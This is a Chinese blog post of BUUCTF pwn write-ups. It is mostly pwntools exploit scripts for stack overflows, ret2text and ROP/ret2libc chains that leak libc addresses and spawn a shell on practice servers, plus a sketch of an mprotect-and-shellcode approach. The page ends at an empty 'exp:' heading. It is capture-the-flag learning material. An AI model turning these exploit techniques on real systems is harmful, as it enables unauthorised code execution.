<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    buuctf pwn |
    
    summerN&#39;s blog</title>
  
    <link rel="shortcut icon" href="/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<script src="/js/pace.min.js"></script>

<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="summerN's blog" type="application/atom+xml">
</head>

<body>
<main class="content">
  <section class="outer">
  

<article id="post-buuctf" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      buuctf pwn
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/02/13/buuctf/" class="article-date">
  <time datetime="2020-02-12T16:00:00.000Z" itemprop="datePublished">2020-02-13</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <h3 id="1-测试nc"><a href="#1-测试nc" class="headerlink" title="1.测试nc"></a>1.测试nc</h3><a id="more"></a>

<p>nc 出结果</p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>简单的栈溢出</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#p = process("./pwn1")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28852</span>)</span><br><span class="line">p.recvuntil(<span class="string">"please input"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0xf</span> + <span class="number">8</span>)+ p64(<span class="number">0x401186</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>但是出现了问题，无法在远程无法打通参考文章</p>
<p><a href="http://blog.eonew.cn/archives/958" target="_blank" rel="noopener">在一些64位的glibc的payload调用system函数失败问题</a></p>
<p>我们这里选择转移栈地址</p>
<p>由于text段中有call system 所以我们有两种exp的写法</p>
<p>现在在我看来这两个exp的主要区别在于</p>
<p>payload += p64(0x0000000000401191)</p>
<p>这一串payload</p>
<p>在第2个payload中，如果去掉上面那个，本地可以打通，但是远程无法打通，应该是因为堆栈没有对齐</p>
<p>但是我们加入了上面那一串后，那一串的地址为一个没有参数的函数，所以我们把system的地址放入了其返回地址处，如果有参数的话我们放入的system地址变为了参数，就无法调用system，暂时这样里理解</p>
<p><a href="https://www.jianshu.com/p/4928e726a43f" target="_blank" rel="noopener">https://www.jianshu.com/p/4928e726a43f</a></p>
<p>1</p>
<p>这里我们使用的是text中的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28852'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0x0000000000401191</span>)</span><br><span class="line"><span class="comment">#payload += p64(elf.symbols["system"])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>2</p>
<p>这里使用的是elf.symbols获取的system地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./pwn1'</span></span><br><span class="line"><span class="comment">#libc_name = '/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28852'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(file_name)</span></span><br><span class="line"></span><br><span class="line">p = remote(ip,int(port))</span><br><span class="line"></span><br><span class="line">bin_sh_addr=<span class="number">0x40201B</span></span><br><span class="line">pop_rdi=<span class="number">0x4011fb</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">23</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_sh_addr)</span><br><span class="line">payload += p64(<span class="number">0x0000000000401016</span>)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">"system"</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3 warmup_csaw_2016"></a>3 warmup_csaw_2016</h2><p>sprintf()函数泄露了危险函数地址</p>
<p>简单的栈溢出漏洞</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">"node3.buuoj.cn"</span></span><br><span class="line">port = <span class="string">"26985"</span></span><br><span class="line">file_name = <span class="string">"./1"</span></span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"WOW:"</span>)</span><br><span class="line"><span class="comment">#print p.recvline()[0:-1].ljust(8,"\x00")</span></span><br><span class="line"><span class="comment">#print p.recvline()[0:-1]</span></span><br><span class="line"></span><br><span class="line">sys_add = int(p.recvline()[<span class="number">0</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> sys_add</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * (<span class="number">0x40</span> + <span class="number">8</span>) + p64(sys_add)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/yishizuofei/article/details/78195255" target="_blank" rel="noopener">https://blog.csdn.net/yishizuofei/article/details/78195255</a><br>sprintf函数</p>
<h2 id="4-pwn1-sctf-2016"><a href="#4-pwn1-sctf-2016" class="headerlink" title="4.pwn1_sctf_2016"></a>4.pwn1_sctf_2016</h2><p><a href="https://www.runoob.com/cprogramming/c-function-fgets.html" target="_blank" rel="noopener">https://www.runoob.com/cprogramming/c-function-fgets.html</a></p>
<p>fget()函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">'/lib/i386-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'27432'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line">backdoor = <span class="number">0x08048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"I"</span> * <span class="number">0x14</span> + <span class="string">"a"</span> * <span class="number">4</span> + p32(backdoor)</span><br><span class="line"><span class="comment">#p.recvuntil("Tell me something about yourself: ")</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recvall()</span><br></pre></td></tr></table></figure>

<p>貌似p.recvuntil()无法接受到print打印的数据，，貌似</p>
<h2 id="5-iscn-2019-c-1"><a href="#5-iscn-2019-c-1" class="headerlink" title="5 iscn_2019_c_1"></a>5 iscn_2019_c_1</h2><p>这个题的大致思路就是通过栈溢出漏洞将某个函数的got地址通过puts函数泄露出来从而获取libc的版本</p>
<p>获取libc版本后搜索system或者execve的地址与bin/sh从而获取shell</p>
<p>附上libcsearch的github</p>
<p><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></p>
<p>exp:</p>
<p>先膜拜大佬pumpink9的exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='pumpkin9@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">file_name = <span class="string">'./ciscn_2019_c_1'</span></span><br><span class="line">libc_name = <span class="string">'../libc/18-libc64.so'</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'25405'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">	p = process(file_name)</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,int(port))</span><br><span class="line">	elf = ELF(file_name)</span><br><span class="line">	libc = ELF(<span class="string">"../libc/18-libc64.so"</span>)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line">ls = <span class="keyword">lambda</span> name,x : log.success(name+<span class="string">':0x%x'</span>%x)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">main = <span class="number">0x000000000400B28</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*(<span class="number">0x50</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(rdi_ret)+p64(elf.got[<span class="string">'__libc_start_main'</span>])+p64(elf.plt[<span class="string">'puts'</span>])+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">"encrypted\n"</span>,(payload))</span><br><span class="line">p.recvuntil(<span class="string">"@\n"</span>)</span><br><span class="line">addr = u64(p.recvuntil(<span class="string">"\n"</span>,<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">ls(<span class="string">"libc start main"</span>,addr)</span><br><span class="line">libc.address = addr-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">ls(<span class="string">"libc addr"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x58</span></span><br><span class="line">payload +=  p64(rdi_ret)+p64(libc.search(<span class="string">"/bin/sh\x00"</span>).next())+p64(ret)+p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.sendlineafter(<span class="string">"choice!\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"encrypted\n"</span>,(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>之后在上我本地能打通，远程打不通的exp（估计是因为libc不行）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'./1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'28653'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line"><span class="comment">#p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400790</span></span><br><span class="line">put_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">put_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> put_got</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice!'</span>,<span class="string">"1"</span>)</span><br><span class="line">payload1 = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(start)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"@\n"</span>)</span><br><span class="line">add = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="comment">#print add</span></span><br><span class="line"><span class="comment">#print p.recvall()</span></span><br><span class="line">libc = LibcSearcher(<span class="string">"puts"</span>,hex(add))</span><br><span class="line">libc_add = add - libc.dump(<span class="string">"puts"</span>)</span><br><span class="line"><span class="keyword">print</span> libc_add</span><br><span class="line">sys_add = libc_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">bin_add = libc_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Input your choice!"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload2 = <span class="string">"a"</span> * (offset + <span class="number">8</span>) + p64(pop_rdi) + p64(bin_add) + p64(sys_add)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="6-HarekazeCTF2019-baby-rop2"><a href="#6-HarekazeCTF2019-baby-rop2" class="headerlink" title="6.[HarekazeCTF2019]baby_rop2"></a>6.[HarekazeCTF2019]baby_rop2</h2><p>有点小难受，第一次用printf泄露</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment">#__author__='summerN@DL&amp;S'</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">file_name = <span class="string">'1'</span></span><br><span class="line">libc_name = <span class="string">''</span></span><br><span class="line">ip = <span class="string">'node3.buuoj.cn'</span></span><br><span class="line">port = <span class="string">'29757'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.arch = 'amd64'</span></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment">#libc = ELF(libc_name)</span></span><br><span class="line">elf = ELF(file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(file_name)</span></span><br><span class="line">p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400636</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line"><span class="comment">#print_plt = elf.got['printf']</span></span><br><span class="line">printf_plt = <span class="number">0x4004f0</span></span><br><span class="line"><span class="comment">#print hex(print_plt)</span></span><br><span class="line">payload = <span class="string">'a'</span> * (<span class="number">0x20</span>) + <span class="string">"a"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What's your name?"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">read_add = u64(p.recv(<span class="number">6</span>).strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(read_add)</span><br><span class="line">libc = LibcSearcher(<span class="string">"read"</span>,int(read_add))</span><br><span class="line">base_add = read_add - libc.dump(<span class="string">"read"</span>)</span><br><span class="line">sys_add = base_add + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">str_bin_sh = base_add + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print str_bin_sh</span></span><br><span class="line">payload2 = <span class="string">'a'</span> * (<span class="number">0x20</span>) + <span class="string">'a'</span> * <span class="number">8</span> + p64(pop_rdi) + p64(str_bin_sh) + p64(sys_add) + p64(main)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="7-get-started-3dsctf-2016"><a href="#7-get-started-3dsctf-2016" class="headerlink" title="7.get_started_3dsctf_2016"></a>7.get_started_3dsctf_2016</h2><p>啥也不会，，涉及到内存修改的问题</p>
<h3 id="第一个本地能打通的思路-远程打不了"><a href="#第一个本地能打通的思路-远程打不了" class="headerlink" title="第一个本地能打通的思路(远程打不了)"></a>第一个本地能打通的思路(远程打不了)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">修改eip跳转到get_flag函即可,可是直接进行跳转到该函数,会存在一个过滤,把该地址给过滤掉了,其实往后退几个指令就行</span><br><span class="line">在buuctf里远程打不了.</span><br><span class="line"></span><br><span class="line">外国大牛博客:http://www.infohelp.org</span><br><span class="line">下面是本地能打的exp,(前提是你自己创建了一个flag.txt文件)</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">sh = elf.process()</span><br><span class="line">printf_addr = <span class="number">0x0804F0E0</span></span><br><span class="line">main = <span class="number">0x08048A20</span></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">payload_01 = <span class="string">'A'</span> * <span class="number">56</span> + p32(get_flag)</span><br><span class="line">sh.sendline(payload_01)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="第二个思路-该方法能打远程"><a href="#第二个思路-该方法能打远程" class="headerlink" title="第二个思路:(该方法能打远程)"></a>第二个思路:(该方法能打远程)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">修改使用mprotec函数修改内存的权限为可读可写可执行,然后在该内存中写入自己的shellcode,执行该代码即可.</span><br><span class="line">首先按先说一下mprotect函数:原型如下</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr 内存启始地址</span><br><span class="line">len  修改内存的长度</span><br><span class="line">prot 内存的权限</span><br><span class="line">要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或</span><br><span class="line">$ .&#x2F; get_started_3dsctf_2016 &amp;</span><br><span class="line">$ cat &#x2F;proc&#x2F;[you_pid]&#x2F;maps 查看内存区域</span><br><span class="line">可以查看到,内存可读可写的地址为: 0x80EB000 ,所以我们对该内存进行增加一个权限</span><br></pre></td></tr></table></figure>

<p>exp:</p>
